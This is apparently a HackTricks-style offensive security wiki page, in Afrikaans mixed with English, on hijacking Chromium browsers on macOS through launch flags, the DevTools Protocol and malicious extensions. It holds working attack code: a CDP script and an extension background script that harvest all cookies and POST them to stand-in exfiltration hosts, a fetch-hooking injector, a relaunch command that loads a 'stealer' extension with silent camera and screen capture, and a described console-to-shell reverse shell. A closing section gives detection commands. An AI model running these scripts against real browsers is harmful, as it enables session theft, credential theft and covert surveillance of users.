# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Chromium-gebaseerde browsers soos Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi en Opera gebruik almal dieselfde command-line switches, preference files en DevTools automation interfaces. Op macOS kan enige user met GUI-toegang 'n bestaande browser-sessie terminateer en dit weer oopmaak met arbitrêre flags, extensions of DevTools endpoints wat met die teiken se entitlements loop.

#### Launching Chromium with custom flags on macOS

macOS hou 'n enkele UI-instance per Chromium-profiel, dus vereis instrumentation normaalweg dat die browser geforseerd gesluit word (byvoorbeeld met `osascript -e 'tell application "Google Chrome" to quit'`). Attackers launch dit tipies weer met `open -na "Google Chrome" --args <flags>` sodat hulle arguments kan inject sonder om die app bundle te wysig. Deur daardie command binne 'n user LaunchAgent (`~/Library/LaunchAgents/*.plist`) of login hook te wrap, word gewaarborg dat die tampered browser ná 'n reboot/logoff weer respawn.

#### `--load-extension` Flag

Die `--load-extension` flag laai unpacked extensions outomaties (comma-separated paths). Kombineer dit met `--disable-extensions-except` om legitimate extensions te blokkeer terwyl slegs jou payload geforseer word om te run. Malicious extensions kan high-impact permissions soos `debugger`, `webRequest` en `cookies` versoek om na DevTools-protocols te pivot, CSP headers te patch, HTTPS te downgrade of session material te exfiltreer sodra die browser start.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Hierdie switches expose die Chrome DevTools Protocol (CDP) oor TCP of 'n pipe sodat external tooling die browser kan drive. Google het wydverspreide infostealer-abuse van hierdie interface waargeneem en, vanaf Chrome 136 (Maart 2025), word die switches vir die default profile geïgnoreer tensy die browser met 'n non-standard `--user-data-dir` gelaunch word. Dit forceer App-Bound Encryption op real profiles, maar attackers kan steeds 'n fresh profile spawn, die victim coerce om daarin te authenticate (phishing/triage assistance), en cookies, tokens, device trust states of WebAuthn registrations via CDP harvest.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Hierdie flag redirect die hele browser-profiel (History, Cookies, Login Data, Preference files, ens.) na 'n attacker-controlled path. Dit is mandatory wanneer moderne Chrome builds met `--remote-debugging-port` gekombineer word, en dit hou ook die tampered profile geïsoleer sodat jy voorafgevulde `Preferences`- of `Secure Preferences`-files kan drop wat security prompts disable, extensions outomaties install en default schemes verander.

#### `--use-fake-ui-for-media-stream` Flag

Hierdie switch bypass die camera/mic permission prompt sodat enige page wat `getUserMedia` call, onmiddellik access ontvang. Kombineer dit met flags soos `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` of CDP `Browser.grantPermissions` commands om audio/video, desk-share of WebRTC permission checks stilweg te capture sonder user interaction.<sup>[[4]](#references)</sup>

## Delivery & Relaunch Patterns Seen in the Wild

CDP-abuse is algemeen 'n **post-exploitation**-stage eerder as die initial payload. 'n Onlangse macOS-campaign wat developers geteiken het, het 'n poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) gebruik sodat code slegs uitgevoer is wanneer die victim die project **gebou** het, nie wanneer hulle dit bloot geclone of oopgemaak het nie. Ná daardie eerste execution het die malware ook ander `.xcodeproj`-trees geïnfecteer, malicious Git `pre-commit` hooks bygevoeg en ZIP-archives vir meer Xcode-projects gesoek.<sup>[[3]](#references)</sup>

Vir Chromium-abuse is dit belangrik omdat die attacker nie die browser binary self hoef te patch nie. 'n Short-lived build-phase / `osascript` stager kan eerder 'n **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, ens.) install wat die legitimate browser elke keer wanneer die user dit start, weer met attacker-controlled flags oopmaak.<sup>[[3]](#references)</sup>

> [!TIP]
> Op developer-endpoints, inspecteer `.pbxproj`-files, `.git/hooks/pre-commit` en ZIPs wat `.xcodeproj` bevat vir onverwagte `curl`, `osascript`, `xxd`, geneste `base64` of Chrome-relaunch logic.

## Remote Debugging & DevTools Protocol Abuse

Sodra Chrome met 'n dedicated `--user-data-dir` en `--remote-debugging-port` relaunched is, kan jy oor CDP attach (byvoorbeeld via `chrome-remote-interface`, `puppeteer` of `playwright`) en high-privilege workflows script:

- **Cookie/session theft:** `Network.getAllCookies` en `Storage.getCookies` return HttpOnly-values selfs wanneer App-Bound encryption normaalweg filesystem access sou block, omdat CDP die running browser vra om hulle te decrypt.
- **Permission tampering:** `Browser.grantPermissions` en `Emulation.setGeolocationOverride` laat jou toe om camera/mic-prompts te bypass (veral wanneer dit met `--use-fake-ui-for-media-stream` gekombineer word) of location-based security checks te falsify.
- **Keystroke/script injection:** `Runtime.evaluate` execute arbitrêre JavaScript binne die active tab, wat credential lifting, DOM-patching of die injection van persistence beacons moontlik maak wat navigation oorleef.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` en `Fetch.enable` intercept authenticated requests/responses in real time sonder om disk artifacts aan te raak.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Omdat Chrome 136 CDP op die default profile blokkeer, lewer die kopieer/plak van die slagoffer se bestaande `~/Library/Application Support/Google/Chrome`-gids na ’n staging path nie meer decrypted cookies op nie. Gebruik eerder social engineering om die gebruiker binne die instrumented profile te laat authenticateer (bv. ’n "helpful" support session), of capture MFA tokens onderweg via CDP-controlled network hooks.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

’n Praktiese malware-patroon is:

1. Restart die userland implant of wrapper elke keer wanneer Chrome launched word.
2. Spawn die legitieme browser met `--remote-debugging-port=<port>` en, op Chrome 136+, gewoonlik ’n gepaarde nie-standaard `--user-data-dir=<dir>`.
3. Start ’n helper wat aan die plaaslike CDP WebSocket connect en ’n pre-document hook met `Page.addScriptToEvaluateOnNewDocument` registreer.<sup>[[2]](#references)</sup>

Daardie helper kan JavaScript **voor** site code run inject, wat ideaal is om `window.fetch`, `XMLHttpRequest`, wallet providers of autofill flows te hook sonder om lêers op disk te patch.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
'n Sterker variant verander die browser in 'n **host command bridge**: geïnjekteerde JavaScript stuur 'n `console.log` met 'n delimiter-merker uit, die plaaslike helper monitor `Runtime.consoleAPICalled`, verwyder die merker, voer die res deur die host shell uit (byvoorbeeld Go se `exec.Command`), en stuur stdout/stderr oor die aanvaller se WebSocket terug. Dit gradeer script-uitvoering op tab-vlak op na 'n grotendeels fileless reverse shell.<sup>[[3]](#references)</sup>

## Extension-Gebaseerde Injection via Debugger API

Die 2023-navorsing "Chrowned by an Extension" het gedemonstreer dat 'n kwaadwillige extension wat die `chrome.debugger` API gebruik, aan enige tab kan koppel en dieselfde DevTools-bevoegdhede as `--remote-debugging-port` kan verkry.<sup>[[6]](#references)</sup> Dit breek die oorspronklike isolasie-aannames (extensions bly in hul eie konteks) en maak die volgende moontlik:

- Stil cookie- en credential-diefstal met `Network.getAllCookies`/`Fetch.getResponseBody`.
- Wysiging van site permissions (kamera, mikrofoon, geolocation) en omseiling van security interstitials, wat phishing pages in staat stel om Chrome-dialoge na te boots.
- On-path-manipulasie van TLS-waarskuwings, downloads of WebAuthn-prompts deur `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` of `Security.handleCertificateError` programmaties te beheer.

Laai die extension met `--load-extension`/`--disable-extensions-except` sodat geen gebruikersinteraksie vereis word nie. 'n Minimale background script wat die API weaponize, lyk soos volg:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die uitbreiding kan ook op `Debugger.paused`-events inteken om JavaScript-veranderlikes te lees, inline scripts te patch, of pasgemaakte breakpoints te plaas wat navigasie oorleef. Omdat alles binne die gebruiker se GUI-sessie loop, word Gatekeeper en TCC nie geaktiveer nie, wat hierdie tegniek ideaal maak vir malware wat reeds uitvoering binne die gebruiker se konteks bereik het.<sup>[[6]](#references)</sup>

## Opsporing & Hunting

- Genereer ’n alert wanneer Chromium-browsers met `--remote-debugging-port`, `--remote-debugging-pipe`, of ’n verdagte `--user-data-dir` geloods word, veral wanneer die parent `bash`, `sh`, `osascript`, `xcodebuild`, of ’n LaunchAgent-helper is.
- Soek na kort kettings waar ’n helper ’n plaaslike CDP WebSocket oopmaak, `Page.addScriptToEvaluateOnNewDocument` registreer, en daarna ’n langdurige uitgaande WebSocket/HTTPS-verbinding maak.
- Hunt vir console-to-shell-bridges deur browser-aktiwiteit van `Runtime.consoleAPICalled` te korreleer met child shells of helper-prosesse wat aanvaller-verskafte commands uitvoer.
- Op developer-Macs, hersien `.pbxproj`-`PBXShellScriptBuildPhase`-inskrywings, Git `pre-commit` hooks, Dock/login-item-relaunchers, en ZIP-bevattende Xcode-projekte vir browser-wrapper-installasie.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Gereedskap

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiseer Chromium-launches met payload extensions en stel interaktiewe CDP hooks bloot.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Soortgelyke tooling wat op traffic interception en browser instrumentation vir macOS-operateurs fokus.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-biblioteek om Chrome DevTools Protocol-dumps (cookies, DOM, permissions) te script sodra ’n `--remote-debugging-port`-instansie aktief is.

### Voorbeeld
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Vind meer voorbeelde in die tools-skakels.

## Verwysings

- [1] [Chrome DevTools Protocol - Runtime-domein](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page-domein](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Die Xcode Assassin keer terug: 'n diepgaande ontleding van die jongste XCSSET-weergawe - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) op X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Veranderinge aan remote debugging-skakelaars om sekuriteit te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Gekroon deur 'n uitbreiding: Misbruik van die Chrome DevTools Protocol deur die Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
